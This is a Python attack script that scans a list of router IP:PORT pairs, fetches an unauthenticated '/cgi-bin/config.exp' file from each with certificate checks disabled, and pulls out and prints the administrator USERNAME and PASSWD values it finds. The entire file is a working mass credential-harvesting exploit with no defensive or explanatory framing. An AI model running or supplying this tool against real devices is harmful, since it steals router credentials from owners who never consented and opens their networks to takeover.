#!/usr/bin/python
# coding: utf-8
import argparse
import requests
import sys
from colorama import init, Fore

from requests.exceptions import RequestException, Timeout
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

init(autoreset=True)

def write_file(data, outfile):
    try:
        with open(outfile, "w") as f:
            f.write(data)
    except Exception as e:
        sys.exit(f"{e.__class__.__name__}: {e}")

def get_config(ip_port, ssl=True, timeout=20):
    ip, port = ip_port.split(":")
    url = f"{ 'https' if ssl else 'http' }://{ip}:{port}"

    try:
        print(f"\n{Fore.CYAN}URL={url}{Fore.RESET}")
        r = requests.get(f"{url}/cgi-bin/config.exp", verify=False, timeout=timeout)
        r.raise_for_status()  # Raise HTTPError for bad responses

    except Timeout:
        print(f"{Fore.YELLOW}Timeout: No response within {timeout} seconds. Moving to the next target.{Fore.RESET}")
        return  # Move to the next IP:PORT pair

    except RequestException as e:
        print(f"{Fore.RED}Error: {e}{Fore.RESET}")
        return  # Move to the next IP:PORT pair

    if "USERNAME=" in r.text and "PASSWD=" in r.text:
        username_start = r.text.find("USERNAME=")
        username_end = r.text.find("\n", username_start)
        username = r.text[username_start:username_end].strip()

        password_start = r.text.find("PASSWD=")
        password_end = r.text.find("\n", password_start)
        password = r.text[password_start:password_end].strip()

        print(f"{Fore.GREEN}Username: {username}{Fore.RESET}")
        print(f"{Fore.GREEN}Password: {password}{Fore.RESET}")
    else:
        print(f"{Fore.YELLOW}No matching credentials found.{Fore.RESET}")

def main():
    parser = argparse.ArgumentParser(description="Retrieve configuration from multiple routers.")
    parser.add_argument('-f', '--file', help="File containing IP:PORT pairs", required=True)
    parser.add_argument('-s', '--ssl', action="store_true", default=True, help="Use SSL")
    parser.add_argument('-t', '--timeout', type=int, default=20, help="Timeout for each request in seconds")

    args = parser.parse_args()

    with open(args.file, 'r') as file:
        for line in file:
            ip_port = line.strip()
            get_config(ip_port, ssl=args.ssl, timeout=args.timeout)

if __name__ == "__main__":
    main()
